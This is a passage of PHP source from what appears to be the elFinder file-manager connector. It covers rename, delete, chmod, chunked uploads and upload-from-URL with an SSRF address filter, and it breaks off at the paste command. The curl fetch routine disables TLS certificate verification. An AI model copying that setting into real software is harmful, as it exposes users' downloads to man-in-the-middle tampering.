                        $_args = array('name' => $name);
                        foreach ($this->listeners['rename.pre'] as $handler) {
                            $_res = call_user_func_array($handler, array('rename', &$_args, $this, $volume));
                            if (!empty($_res['preventexec'])) {
                                break;
                            }
                        }
                        $name = $_args['name'];
                    }
                }
            }
            foreach ($rms as $rm) {
                if ($type === 'normal') {
                    $rname = $volume->uniqueName($volume->realpath($rm['phash']), $name, '', false);
                } else {
                    $rname = $name;
                    if ($type === 'extention') {
                        $splits = elFinder::splitFileExtention($rm['name']);
                        $rname = $splits[0] . '.' . $name;
                    } else if ($type === 'prefix') {
                        $rname = $name . $rm['name'];
                    } else if ($type === 'suffix') {
                        $splits = elFinder::splitFileExtention($rm['name']);
                        $rname = $splits[0] . $name . ($splits[1] ? ('.' . $splits[1]) : '');
                    }
                    $rname = $volume->uniqueName($volume->realpath($rm['phash']), $rname, '', true);
                }
                if ($file = $volume->rename($rm['hash'], $rname)) {
                    $files[] = $file;
                    $removed[] = $rm;
                } else {
                    $errs[] = $rm['name'];
                }
            }
            if (!$files) {
                $res['error'] = $this->error(self::ERROR_RENAME, join(', ', $errs), $volume->error());
                if (!$res['warning']) {
                    unset($res['warning']);
                }
                return $res;
            }
            if ($errs) {
                array_push($res['warning'], self::ERROR_RENAME, join(', ', $errs), $volume->error());
            }
            if (!$res['warning']) {
                unset($res['warning']);
            }
            $res['added'] = $files;
            $res['removed'] = $removed;
            return $res;
        } else {
            if (!($rm = $volume->file($target))) {
                return array('error' => $this->error(self::ERROR_RENAME, '#' . $target, self::ERROR_FILE_NOT_FOUND));
            }
            if ($this->itemLocked($target)) {
                return array('error' => $this->error(self::ERROR_LOCKED, $rm['name']));
            }
            $rm['realpath'] = $volume->realpath($target);
            $file = $volume->rename($target, $name);
            if ($file === false) {
                return array('error' => $this->error(self::ERROR_RENAME, $rm['name'], $volume->error()));
            } else {
                if ($file['hash'] !== $rm['hash']) {
                    return array('added' => array($file), 'removed' => array($rm));
                } else {
                    return array('changed' => array($file));
                }
            }
        }
    }

    protected function duplicate($args)
    {
        $targets = is_array($args['targets']) ? $args['targets'] : array();
        $result = array();
        $suffix = empty($args['suffix']) ? 'copy' : $args['suffix'];
        $this->itemLock($targets);
        foreach ($targets as $target) {
            elFinder::checkAborted();
            if (($volume = $this->volume($target)) == false
                || ($src = $volume->file($target)) == false) {
                $result['warning'] = $this->error(self::ERROR_COPY, '#' . $target, self::ERROR_FILE_NOT_FOUND);
                break;
            }
            if (($file = $volume->duplicate($target, $suffix)) == false) {
                $result['warning'] = $this->error($volume->error());
                break;
            }
        }
        return $result;
    }

    protected function rm($args)
    {
        $targets = is_array($args['targets']) ? $args['targets'] : array();
        $result = array('removed' => array());
        foreach ($targets as $target) {
            elFinder::checkAborted();
            if (($volume = $this->volume($target)) == false) {
                $result['warning'] = $this->error(self::ERROR_RM, '#' . $target, self::ERROR_FILE_NOT_FOUND);
                break;
            }
            if ($this->itemLocked($target)) {
                $rm = $volume->file($target);
                $result['warning'] = $this->error(self::ERROR_LOCKED, $rm['name']);
                break;
            }
            if (!$volume->rm($target)) {
                $result['warning'] = $this->error($volume->error());
                break;
            }
        }
        return $result;
    }

    protected function subdirs($args)
    {
        $result = array('subdirs' => array());
        $targets = $args['targets'];
        foreach ($targets as $target) {
            if (($volume = $this->volume($target)) !== false) {
                $result['subdirs'][$target] = $volume->subdirs($target) ? 1 : 0;
            }
        }
        return $result;
    }

    protected function editor($args = array())
    {
        $name = $args['name'];
        if (is_array($name)) {
            $res = array();
            foreach ($name as $c) {
                $class = 'elFinderEditor' . $c;
                if (class_exists($class)) {
                    $editor = new $class($this, $args['args']);
                    $res[$c] = $editor->enabled();
                } else {
                    $res[$c] = 0;
                }
            }
            return $res;
        } else {
            $class = 'elFinderEditor' . $name;
            $method = '';
            if (class_exists($class)) {
                $editor = new $class($this, $args['args']);
                $method = $args['method'];
                if ($editor->isAllowedMethod($method) && method_exists($editor, $method)) {
                    return $editor->$method();
                }
            }
            return array('error', $this->error(self::ERROR_UNKNOWN_CMD, 'editor.' . $name . '.' . $method));
        }
    }

    protected function abort($args = array())
    {
        if (!elFinder::$connectionFlagsPath || $_SERVER['REQUEST_METHOD'] === 'HEAD') {
            return;
        }
        $flagFile = elFinder::$connectionFlagsPath . DIRECTORY_SEPARATOR . 'elfreq%s';
        if (!empty($args['makeFile'])) {
            self::$abortCheckFile = sprintf($flagFile, self::filenameDecontaminate($args['makeFile']));
            touch(self::$abortCheckFile);
            $GLOBALS['elFinderAbortFiles'][self::$abortCheckFile] = true;
            return;
        }
        $file = !empty($args['id']) ? sprintf($flagFile, self::filenameDecontaminate($args['id'])) : self::$abortCheckFile;
        $file && is_file($file) && unlink($file);
    }

    protected function validate_address($url)
    {
        $info = parse_url($url);
        $host = trim(strtolower($info['host']), '.');
        if (preg_match('/^\[.*\]$/', $host)) return false;
        if (strpos($host, '.') === false) return false;
        if (strpos($host, '%') !== false) return false;
        if (preg_match('/\b(?:localhost|localdomain)\b/', $host)) return false;
        $ip = gethostbyname($host);
        if (preg_match('/^0x[0-9a-f]+|[0-9]+(?:\.(?:0x[0-9a-f]+|[0-9]+)){1,3}$/', $ip, $m)) {
            $long = (int)sprintf('%u', ip2long($ip));
            if (!$long) return false;
            $local = (int)sprintf('%u', ip2long('127.255.255.255')) >> 24;
            $prv1  = (int)sprintf('%u', ip2long('10.255.255.255')) >> 24;
            $prv2  = (int)sprintf('%u', ip2long('172.31.255.255')) >> 20;
            $prv3  = (int)sprintf('%u', ip2long('192.168.255.255')) >> 16;
            $link  = (int)sprintf('%u', ip2long('169.254.255.255')) >> 16;
            if (!isset($this->uploadAllowedLanIpClasses['local']) && $long >> 24 === $local) return false;
            if (!isset($this->uploadAllowedLanIpClasses['private_a']) && $long >> 24 === $prv1) return false;
            if (!isset($this->uploadAllowedLanIpClasses['private_b']) && $long >> 20 === $prv2) return false;
            if (!isset($this->uploadAllowedLanIpClasses['private_c']) && $long >> 16 === $prv3) return false;
            if (!isset($this->uploadAllowedLanIpClasses['link']) && $long >> 16 === $link) return false;
            $info['ip'] = long2ip($long);
            if (!isset($info['port'])) {
                $info['port'] = $info['scheme'] === 'https' ? 443 : 80;
            }
            if (!isset($info['path'])) {
                $info['path'] = '/';
            }
            return $info;
        } else {
            return false;
        }
    }

    protected function get_remote_contents(&$url, $timeout = 30, $redirect_max = 5, $ua = 'Mozilla/5.0', $fp = null)
    {
        if (preg_match('~^(?:ht|f)tps?://[-_.!\~*\'()a-z0-9;/?:\@&=+\$,%#\*\[\]]+~i', $url)) {
            $info = $this->validate_address($url);
            if ($info === false) {
                return false;
            }
            $url = $info['scheme'].'://'.$info['host'].(!empty($info['port'])? (':'.$info['port']) : '').$info['path'].(!empty($info['query'])? ('?'.$info['query']) : '').(!empty($info['fragment'])? ('#'.$info['fragment']) : '');
            if ($this->urlUploadFilter && is_callable($this->urlUploadFilter)) {
                if (!call_user_func_array($this->urlUploadFilter, array($url, $this))) {
                    return false;
                }
            }
            $method = (function_exists('curl_exec')) ? 'curl_get_contents' : 'fsock_get_contents';
            return $this->$method($url, $timeout, $redirect_max, $ua, $fp, $info);
        }
        return false;
    }

    protected function curl_get_contents(&$url, $timeout, $redirect_max, $ua, $outfp, $info)
    {
        if ($redirect_max == 0) {
            return false;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        if ($outfp) {
            curl_setopt($ch, CURLOPT_FILE, $outfp);
        } else {
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        }
        curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 1);
        curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_RESOLVE, array($info['host'] . ':' . $info['port'] . ':' . $info['ip']));
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 301 || $http_code == 302) {
            $new_url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
            $info = $this->validate_address($new_url);
            if ($info === false) {
                return false;
            }
            return $this->curl_get_contents($new_url, $timeout, $redirect_max - 1, $ua, $outfp, $info);
        }
        curl_close($ch);
        return $outfp ? $outfp : $result;
    }

    protected function fsock_get_contents(&$url, $timeout, $redirect_max, $ua, $outfp, $info)
    {
        $connect_timeout = 3;
        $connect_try = 3;
        $method = 'GET';
        $readsize = 4096;
        $ssl = '';
        $getSize = null;
        $headers = '';
        $arr = $info;
        if ($arr['scheme'] === 'https') {
            $ssl = 'ssl://';
        }
        $arr['query'] = isset($arr['query']) ? '?' . $arr['query'] : '';
        $url_base = $arr['scheme'] . '://' . $info['host'] . ':' . $info['port'];
        $url_path = isset($arr['path']) ? $arr['path'] : '/';
        $uri = $url_path . $arr['query'];
        $query = $method . ' ' . $uri . " HTTP/1.0\r\n";
        $query .= "Host: " . $arr['host'] . "\r\n";
        $query .= "Accept: */*\r\n";
        $query .= "Connection: close\r\n";
        if (!empty($ua)) $query .= "User-Agent: " . $ua . "\r\n";
        if (!is_null($getSize)) $query .= 'Range: bytes=0-' . ($getSize - 1) . "\r\n";
        $query .= $headers;
        $query .= "\r\n";
        $fp = $connect_try_count = 0;
        while (!$fp && $connect_try_count < $connect_try) {
            $errno = 0;
            $errstr = "";
            $fp = fsockopen($ssl . $arr['host'], $arr['port'], $errno, $errstr, $connect_timeout);
            if ($fp) break;
            $connect_try_count++;
            if (connection_aborted()) {
                throw new elFinderAbortException();
            }
            sleep(1);
        }
        if (!$fp) {
            return false;
        }
        $fwrite = 0;
        for ($written = 0; $written < strlen($query); $written += $fwrite) {
            $fwrite = fwrite($fp, substr($query, $written));
            if (!$fwrite) {
                break;
            }
        }
        if ($timeout) {
            socket_set_timeout($fp, $timeout);
        }
        $_response = '';
        $header = '';
        while ($_response !== "\r\n") {
            $_response = fgets($fp, $readsize);
            $header .= $_response;
        };
        $rccd = array_pad(explode(' ', $header, 2), 2, '');
        $rc = (int)$rccd[1];
        $ret = false;
        switch ($rc) {
            case 307:
            case 303:
            case 302:
            case 301:
                $matches = array();
                if (preg_match('/^Location: (.+?)(#.+)?$/im', $header, $matches) && --$redirect_max > 0) {
                    $_url = $url;
                    $url = trim($matches[1]);
                    if (!preg_match('/^https?:\//', $url)) {
                        if ($url[0] != '/') {
                            $url = substr($url_path, 0, strrpos($url_path, '/')) . '/' . $url;
                        }
                        $url = $url_base . $url;
                    }
                    if ($_url === $url) {
                        sleep(1);
                    }
                    fclose($fp);
                    $info = $this->validate_address($url);
                    if ($info === false) {
                        return false;
                    }
                    return $this->fsock_get_contents($url, $timeout, $redirect_max, $ua, $outfp, $info);
                }
                break;
            case 200:
                $ret = true;
        }
        if (!$ret) {
            fclose($fp);
            return false;
        }
        $body = '';
        if (!$outfp) {
            $outfp = fopen('php://temp', 'rwb');
            $body = true;
        }
        while (fwrite($outfp, fread($fp, $readsize))) {
            if ($timeout) {
                $_status = socket_get_status($fp);
                if ($_status['timed_out']) {
                    fclose($outfp);
                    fclose($fp);
                    return false;
                }
            }
        }
        if ($body) {
            rewind($outfp);
            $body = stream_get_contents($outfp);
            fclose($outfp);
            $outfp = null;
        }
        fclose($fp);
        return $outfp ? $outfp : $body;
    }

    protected function parse_data_scheme($str, $extTable, $args = null)
    {
        $data = $name = $mime = '';
        if ($fp = fopen('data://' . substr($str, 5), 'rb')) {
            if ($data = stream_get_contents($fp)) {
                $meta = stream_get_meta_data($fp);
                $mime = $meta['mediatype'];
            }
            fclose($fp);
        } else if (preg_match('~^data:(.+?/.+?)?(?:;charset=.+?)?;base64,~', substr($str, 0, 128), $m)) {
            $data = base64_decode(substr($str, strlen($m[0])));
            if ($m[1]) {
                $mime = $m[1];
            }
        }
        if ($data) {
            $ext = ($mime && isset($extTable[$mime])) ? '.' . $extTable[$mime] : '';
            if (is_array($args['name']) && isset($args['name'][0])) {
                $name = $args['name'][0];
                if ($ext) {
                    $name = preg_replace('/\.[^.]*$/', '', $name);
                }
            } else {
                $name = substr(md5($data), 0, 8);
            }
            $name .= $ext;
        } else {
            $data = $name = '';
        }
        return array($data, $name);
    }

    protected function detectMimeType($path)
    {
        static $type, $finfo;
        if (!$type) {
            if (class_exists('finfo', false)) {
                $tmpFileInfo = explode(';', finfo_file(finfo_open(FILEINFO_MIME), __FILE__));
            } else {
                $tmpFileInfo = false;
            }
            $regexp = '/text\/x\-(php|c\+\+)/';
            if ($tmpFileInfo && preg_match($regexp, array_shift($tmpFileInfo))) {
                $type = 'finfo';
                $finfo = finfo_open(FILEINFO_MIME);
            } elseif (function_exists('mime_content_type')
                && ($_ctypes = explode(';', mime_content_type(__FILE__)))
                && preg_match($regexp, array_shift($_ctypes))) {
                $type = 'mime_content_type';
            } elseif (function_exists('getimagesize')) {
                $type = 'getimagesize';
            } else {
                $type = 'none';
            }
        }
        $mime = '';
        if ($type === 'finfo') {
            $mime = finfo_file($finfo, $path);
        } elseif ($type === 'mime_content_type') {
            $mime = mime_content_type($path);
        } elseif ($type === 'getimagesize') {
            if ($img = getimagesize($path)) {
                $mime = $img['mime'];
            }
        }
        if ($mime) {
            $mime = explode(';', $mime);
            $mime = trim($mime[0]);
            if (in_array($mime, array('application/x-empty', 'inode/x-empty'))) {
                $mime = 'text/plain';
            } elseif ($mime == 'application/x-zip') {
                $mime = 'application/zip';
            }
        }
        return $mime ? $mime : 'unknown';
    }

    protected function detectFileExtension($volume, $path, $name)
    {
        $mime = $this->detectMimeType($path);
        if ($mime === 'unknown') {
            $mime = 'application/octet-stream';
        }
        $ext = $volume->getExtentionByMime($volume->mimeTypeNormalize($mime, $name));
        return $ext ? ('.' . $ext) : '';
    }

    private function getTempDir($volumeTempPath = null)
    {
        $testDirs = array();
        if ($this->uploadTempPath) {
            $testDirs[] = rtrim(realpath($this->uploadTempPath), DIRECTORY_SEPARATOR);
        }
        if ($volumeTempPath) {
            $testDirs[] = rtrim(realpath($volumeTempPath), DIRECTORY_SEPARATOR);
        }
        if (elFinder::$commonTempPath) {
            $testDirs[] = elFinder::$commonTempPath;
        }
        $tempDir = '';
        foreach ($testDirs as $testDir) {
            if (!$testDir || !is_dir($testDir)) continue;
            if (is_writable($testDir)) {
                $tempDir = $testDir;
                $gc = time() - 3600;
                foreach (glob($tempDir . DIRECTORY_SEPARATOR . 'ELF*') as $cf) {
                    if (filemtime($cf) < $gc) {
                        unlink($cf);
                    }
                }
                break;
            }
        }
        return $tempDir;
    }

    protected function chmod($args)
    {
        $targets = $args['targets'];
        $mode = intval((string)$args['mode'], 8);
        if (!is_array($targets)) {
            $targets = array($targets);
        }
        $result = array();
        if (($volume = $this->volume($targets[0])) == false) {
            $result['error'] = $this->error(self::ERROR_CONF_NO_VOL);
            return $result;
        }
        $this->itemLock($targets);
        $files = array();
        $errors = array();
        foreach ($targets as $target) {
            elFinder::checkAborted();
            $file = $volume->chmod($target, $mode);
            if ($file) {
                $files = array_merge($files, is_array($file) ? $file : array($file));
            } else {
                $errors = array_merge($errors, $volume->error());
            }
        }
        if ($files) {
            $result['changed'] = $files;
            if ($errors) {
                $result['warning'] = $this->error($errors);
            }
        } else {
            $result['error'] = $this->error($errors);
        }
        return $result;
    }

    private function checkChunkedFile($tmpname, $chunk, $cid, $tempDir, $volume = null)
    {
        if (preg_match('/^(.+)(\.\d+_(\d+))\.part$/s', $chunk, $m)) {
            $fname = $m[1];
            $encname = md5($cid . '_' . $fname);
            $base = $tempDir . DIRECTORY_SEPARATOR . 'ELF' . $encname;
            $clast = intval($m[3]);
            if (is_null($tmpname)) {
                ignore_user_abort(true);
                foreach (glob($base . '*') as $cf) {
                    unlink($cf);
                }
                ignore_user_abort(false);
                return null;
            }
            $range = isset($_POST['range']) ? trim($_POST['range']) : '';
            if ($range && preg_match('/^(\d+),(\d+),(\d+)$/', $range, $ranges)) {
                $start = $ranges[1];
                $len = $ranges[2];
                $size = $ranges[3];
                $tmp = $base . '.part';
                $csize = filesize($tmpname);
                $tmpExists = is_file($tmp);
                if (!$tmpExists) {
                    $uploadMaxSize = $volume ? $volume->getUploadMaxSize() : 0;
                    if ($uploadMaxSize > 0 && $size > $uploadMaxSize) {
                        return array(self::ERROR_UPLOAD_FILE_SIZE, false);
                    }
                    $ok = false;
                    if ($fp = fopen($tmp, 'wb')) {
                        flock($fp, LOCK_EX);
                        $ok = ftruncate($fp, $size);
                        flock($fp, LOCK_UN);
                        fclose($fp);
                        touch($base);
                    }
                    if (!$ok) {
                        unlink($tmp);
                        return array(self::ERROR_UPLOAD_TEMP, false);
                    }
                } else {
                    $cnt = 1200;
                    while (!is_file($base) && --$cnt) {
                        usleep(100000);
                    }
                    if (!$cnt) {
                        return array(self::ERROR_UPLOAD_TEMP, false);
                    }
                }
                if ($len != $csize || $start + $len > $size || ($tmpExists && $size != filesize($tmp))) {
                    return array(self::ERROR_UPLOAD_TEMP, false);
                }
                $src = fopen($tmpname, 'rb');
                $fp = fopen($tmp, 'cb');
                fseek($fp, $start);
                $writelen = stream_copy_to_stream($src, $fp, $len);
                fclose($fp);
                fclose($src);
                try {
                    elFinder::checkAborted();
                } catch (elFinderAbortException $e) {
                    unlink($tmpname);
                    is_file($tmp) && unlink($tmp);
                    is_file($base) && unlink($base);
                    throw $e;
                }
                if ($writelen != $len) {
                    return array(self::ERROR_UPLOAD_TEMP, false);
                }
                file_put_contents($base, "\0", FILE_APPEND | LOCK_EX);
                if (filesize($base) >= $clast + 1) {
                    unlink($base);
                    return array($tmp, $fname);
                }
            } else {
                $part = $base . $m[2];
                if (move_uploaded_file($tmpname, $part)) {
                    chmod($part, 0600);
                    if ($clast < count(glob($base . '*'))) {
                        $parts = array();
                        for ($i = 0; $i <= $clast; $i++) {
                            $name = $base . '.' . $i . '_' . $clast;
                            if (is_readable($name)) {
                                $parts[] = $name;
                            } else {
                                $parts = null;
                                break;
                            }
                        }
                        if ($parts) {
                            if (!is_file($base)) {
                                touch($base);
                                if ($resfile = tempnam($tempDir, 'ELF')) {
                                    $target = fopen($resfile, 'wb');
                                    foreach ($parts as $f) {
                                        $fp = fopen($f, 'rb');
                                        while (!feof($fp)) {
                                            fwrite($target, fread($fp, 8192));
                                        }
                                        fclose($fp);
                                        unlink($f);
                                    }
                                    fclose($target);
                                    unlink($base);
                                    return array($resfile, $fname);
                                }
                                unlink($base);
                            }
                        }
                    }
                }
            }
        }
        return array('', '');
    }

    protected function upload($args)
    {
        $ngReg = '/[\/\\?*:|"<>]/';
        $target = $args['target'];
        $volume = $this->volume($target);
        $files = isset($args['FILES']['upload']) && is_array($args['FILES']['upload']) ? $args['FILES']['upload'] : array();
        $header = empty($args['html']) ? array() : array('header' => 'Content-Type: text/html; charset=utf-8');
        $result = array_merge(array('added' => array()), $header);
        $paths = $args['upload_path'] ? $args['upload_path'] : array();
        $chunk = $args['chunk'] ? $args['chunk'] : '';
        $cid = $args['cid'] ? (int)$args['cid'] : '';
        $mtimes = $args['mtime'] ? $args['mtime'] : array();
        $tmpfname = '';
        if (!$volume) {
            return array_merge(array('error' => $this->error(self::ERROR_UPLOAD, self::ERROR_TRGDIR_NOT_FOUND, '#' . $target)), $header);
        }
        if (strpos($chunk, '/') !== false || strpos($chunk, '\\') !== false) {
            return array('error' => $this->error(self::ERROR_UPLOAD));
        }
        if ($args['overwrite'] !== '') {
            $volume->setUploadOverwrite($args['overwrite']);
        }
        $renames = $hashes = array();
        $suffix = '~';
        if ($args['renames'] && is_array($args['renames'])) {
            $renames = array_flip($args['renames']);
            if (is_string($args['suffix']) && !preg_match($ngReg, $args['suffix'])) {
                $suffix = $args['suffix'];
            }
        }
        if ($args['hashes'] && is_array($args['hashes'])) {
            $hashes = array_flip($args['hashes']);
        }
        $this->itemLock($target);
        $extTable = array_flip(array_unique($volume->getMimeTable()));
        if (empty($files)) {
            if (isset($args['upload']) && is_array($args['upload']) && ($tempDir = $this->getTempDir($volume->getTempPath()))) {
                $names = array();
                foreach ($args['upload'] as $i => $url) {
                    if ($chunk) {
                        if ($url === 'chunkfail' && $args['mimes'] === 'chunkfail') {
                            $this->checkChunkedFile(null, $chunk, $cid, $tempDir);
                            if (preg_match('/^(.+)(\.\d+_(\d+))\.part$/s', $chunk, $m)) {
                                $result['warning'] = $this->error(self::ERROR_UPLOAD_FILE, $m[1], self::ERROR_UPLOAD_TEMP);
                            }
                            return $result;
                        } else {
                            $tmpfname = $tempDir . '/' . $chunk;
                            $files['tmp_name'][$i] = $tmpfname;
                            $files['name'][$i] = $url;
                            $files['error'][$i] = 0;
                            $GLOBALS['elFinderTempFiles'][$tmpfname] = true;
                            break;
                        }
                    }
                    $tmpfname = $tempDir . DIRECTORY_SEPARATOR . 'ELF_FATCH_' . md5($url . microtime(true));
                    $GLOBALS['elFinderTempFiles'][$tmpfname] = true;
                    $_name = '';
                    if (substr($url, 0, 5) === 'data:') {
                        list($data, $args['name'][$i]) = $this->parse_data_scheme($url, $extTable, $args);
                    } else {
                        $fp = fopen($tmpfname, 'wb');
                        if ($data = $this->get_remote_contents($url, 30, 5, 'Mozilla/5.0', $fp)) {
                            try {
                                elFinder::checkAborted();
                            } catch(elFinderAbortException $e) {
                                fclose($fp);
                                throw $e;
                            }
                            if (strpos($url, '%') !== false) {
                                $url = rawurldecode($url);
                            }
                            if (is_callable('mb_convert_encoding') && is_callable('mb_detect_encoding')) {
                                $url = mb_convert_encoding($url, 'UTF-8', mb_detect_encoding($url));
                            }
                            $url = iconv('UTF-8', 'UTF-8//IGNORE', $url);
                            $_name = preg_replace('~^.*?([^/#?]+)(?:\?.*)?(?:#.*)?$~', '$1', $url);
                            if (($headers = get_headers($url, true)) && !empty($headers['Content-Disposition'])) {
                                if (preg_match('/filename\*=(?:([a-zA-Z0-9_-]+?)\'\')"?([a-z0-9_.~%-]+)"?/i', $headers['Content-Disposition'], $m)) {
                                    $_name = rawurldecode($m[2]);
                                    if ($m[1] && strtoupper($m[1]) !== 'UTF-8' && function_exists('mb_convert_encoding')) {
                                        $_name = mb_convert_encoding($_name, 'UTF-8', $m[1]);
                                    }
                                } else if (preg_match('/filename="?([ a-z0-9_.~%-]+)"?/i', $headers['Content-Disposition'], $m)) {
                                    $_name = rawurldecode($m[1]);
                                }
                            }
                        } else {
                            fclose($fp);
                        }
                    }
                    if ($data) {
                        if (isset($args['name'][$i])) {
                            $_name = $args['name'][$i];
                        }
                        if ($_name) {
                            $_ext = '';
                            if (preg_match('/(\.[a-z0-9]{1,7})$/', $_name, $_match)) {
                                $_ext = $_match[1];
                            }
                            if ((is_resource($data) && fclose($data)) || file_put_contents($tmpfname, $data)) {
                                $GLOBALS['elFinderTempFiles'][$tmpfname] = true;
                                $_name = preg_replace($ngReg, '_', $_name);
                                list($_a, $_b) = array_pad(explode('.', $_name, 2), 2, '');
                                if ($_b === '') {
                                    if ($_ext) {
                                        rename($tmpfname, $tmpfname . $_ext);
                                        $tmpfname = $tmpfname . $_ext;
                                    }
                                    $_b = $this->detectFileExtension($volume, $tmpfname, $_name);
                                    $_name = $_a . $_b;
                                } else {
                                    $_b = '.' . $_b;
                                }
                                if (isset($names[$_name])) {
                                    $_name = $_a . '_' . $names[$_name]++ . $_b;
                                } else {
                                    $names[$_name] = 1;
                                }
                                $files['tmp_name'][$i] = $tmpfname;
                                $files['name'][$i] = $_name;
                                $files['error'][$i] = 0;
                                $volume->setUploadOverwrite(false);
                            } else {
                                unlink($tmpfname);
                            }
                        }
                    }
                }
            }
            if (empty($files)) {
                return array_merge(array('error' => $this->error(self::ERROR_UPLOAD, self::ERROR_UPLOAD_NO_FILES)), $header);
            }
        }
        $addedDirs = array();
        $errors = array();
        foreach ($files['name'] as $i => $name) {
            if (($error = $files['error'][$i]) > 0) {
                $result['warning'] = $this->error(self::ERROR_UPLOAD_FILE, $name, $error == UPLOAD_ERR_INI_SIZE || $error == UPLOAD_ERR_FORM_SIZE ? self::ERROR_UPLOAD_FILE_SIZE : self::ERROR_UPLOAD_TRANSFER, $error);
                $this->uploadDebug = 'Upload error code: ' . $error;
                break;
            }
            $tmpname = $files['tmp_name'][$i];
            $thash = ($paths && isset($paths[$i])) ? $paths[$i] : $target;
            $mtime = isset($mtimes[$i]) ? $mtimes[$i] : 0;
            if ($name === 'blob') {
                if ($chunk) {
                    if ($tempDir = $this->getTempDir($volume->getTempPath())) {
                        list($tmpname, $name) = $this->checkChunkedFile($tmpname, $chunk, $cid, $tempDir, $volume);
                        if ($tmpname) {
                            if ($name === false) {
                                preg_match('/^(.+)(\.\d+_(\d+))\.part$/s', $chunk, $m);
                                $result['error'] = $this->error(self::ERROR_UPLOAD_FILE, $m[1], $tmpname);
                                $result['_chunkfailure'] = true;
                                $this->uploadDebug = 'Upload error: ' . $tmpname;
                            } else if ($name) {
                                $result['_chunkmerged'] = basename($tmpname);
                                $result['_name'] = $name;
                                $result['_mtime'] = $mtime;
                            }
                        }
                    } else {
                        $result['error'] = $this->error(self::ERROR_UPLOAD_FILE, $chunk, self::ERROR_UPLOAD_TEMP);
                        $this->uploadDebug = 'Upload error: unable open tmp file';
                    }
                    return $result;
                } else {
                    $name = 'image.png';
                }
            }
            if (strtolower(substr($name, 0, 5)) === 'image' && is_array($args['name']) && isset($args['name'][$i])) {
                $type = $files['type'][$i];
                $name = $args['name'][$i];
                $ext = isset($extTable[$type]) ? '.' . $extTable[$type] : '';
                if ($ext) {
                    $name = preg_replace('/\.[^.]*$/', '', $name);
                }
                $name .= $ext;
            }
            try {
                $this->trigger('upload.presave', array(&$thash, &$name, $tmpname, $this, $volume), $errors);
            } catch (elFinderTriggerException $e) {
                if (!is_uploaded_file($tmpname) && unlink($tmpname) && $tmpfname) {
                    unset($GLOBALS['elFinderTempFiles'][$tmpfname]);
                }
                continue;
            }
            clearstatcache();
            if ($mtime && is_file($tmpname)) {
                touch($tmpname, $mtime);
            }
            $fp = null;
            if (!is_file($tmpname) || ($fp = fopen($tmpname, 'rb')) === false) {
                $errors = array_merge($errors, array(self::ERROR_UPLOAD_FILE, $name, ($fp === false? self::ERROR_UPLOAD_TEMP : self::ERROR_UPLOAD_TRANSFER)));
                $this->uploadDebug = 'Upload error: unable open tmp file';
                if (!is_uploaded_file($tmpname)) {
                    if (unlink($tmpname) && $tmpfname) unset($GLOBALS['elFinderTempFiles'][$tmpfname]);
                    continue;
                }
                break;
            }
            $rnres = array();
            if ($thash !== '' && $thash !== $target) {
                if ($dir = $volume->dir($thash)) {
                    $_target = $thash;
                    if (!isset($addedDirs[$thash])) {
                        $addedDirs[$thash] = true;
                        $result['added'][] = $dir;
                        $_phash = isset($dir['phash']) ? $dir['phash'] : null;
                        while ($_phash && !isset($addedDirs[$_phash]) && $_phash !== $target) {
                            if ($_dir = $volume->dir($_phash)) {
                                $addedDirs[$_phash] = true;
                                $result['added'][] = $_dir;
                                $_phash = isset($_dir['phash']) ? $_dir['phash'] : null;
                            } else {
                                break;
                            }
                        }
                    }
                } else {
                    $result['error'] = $this->error(self::ERROR_UPLOAD, self::ERROR_TRGDIR_NOT_FOUND, 'hash@' . $thash);
                    break;
                }
            } else {
                $_target = $target;
                if (isset($renames[$name])) {
                    $dir = $volume->realpath($_target);
                    if (isset($hashes[$name])) {
                        $hash = $hashes[$name];
                    } else {
                        $hash = $volume->getHash($dir, $name);
                    }
                    $rnres = $this->rename(array('target' => $hash, 'name' => $volume->uniqueName($dir, $name, $suffix, true, 0)));
                    if (!empty($rnres['error'])) {
                        $result['warning'] = $rnres['error'];
                        if (!is_array($rnres['error'])) {
                            $errors = array_push($errors, $rnres['error']);
                        } else {
                            $errors = array_merge($errors, $rnres['error']);
                        }
                        continue;
                    }
                }
            }
            if (!$_target || ($file = $volume->upload($fp, $_target, $name, $tmpname, ($_target === $target) ? $hashes : array())) === false) {
                $errors = array_merge($errors, $this->error(self::ERROR_UPLOAD_FILE, $name, $volume->error()));
                fclose($fp);
                if (!is_uploaded_file($tmpname) && unlink($tmpname)) {
                    unset($GLOBALS['elFinderTempFiles'][$tmpname]);
                }
                continue;
            }
            is_resource($fp) && fclose($fp);
            if (!is_uploaded_file($tmpname)) {
                clearstatcache();
                if (!is_file($tmpname) || unlink($tmpname)) {
                    unset($GLOBALS['elFinderTempFiles'][$tmpname]);
                }
            }
            $result['added'][] = $file;
            if ($rnres) {
                $result = array_merge_recursive($result, $rnres);
            }
        }
        if ($errors) {
            $result['warning'] = $errors;
        }
        if ($GLOBALS['elFinderTempFiles']) {
            foreach (array_keys($GLOBALS['elFinderTempFiles']) as $_temp) {
                is_file($_temp) && is_writable($_temp) && unlink($_temp);
            }
        }
        $result['removed'] = $volume->removed();
        if (!empty($args['node'])) {
            $result['callback'] = array('node' => $args['node'], 'bind' => 'upload');
        }
        return $result;
    }

    protected function paste($args)
    {
        $dst = $args['dst'];
        $targets = is_array($args['targets']) ? $args['targets'] : array();
        $cut = !empty($args['cut']);
        $error = $cut ? self::ERROR_MOVE : self::ERROR_COPY;
        $result = array('changed' => array(), 'added' => array(), 'removed' => array(), 'warning' => array());
        if (($dstVolume = $this->volume($dst)) == false) {
            return array('error' => $this->error($error, '#' . $targets[0], self::ERROR_TRGDIR_NOT_FOUND, '#' . $dst));
        }
        $this->itemLock($dst);
        $hashes = $renames = array();
        $suffix = '~';
        if (!empty($args['renames'])) {
            $renames = array_flip($args['renames']);
            if (is_string($args['suffix']) && !preg_match('/[\/\\?*:|"<>]/', $args['suffix'])) {
                $suffix = $args['suffix'];
            }
        }
        if (!empty($args['hashes'])) {
            $hashes = array_flip($args['hashes']);
        }
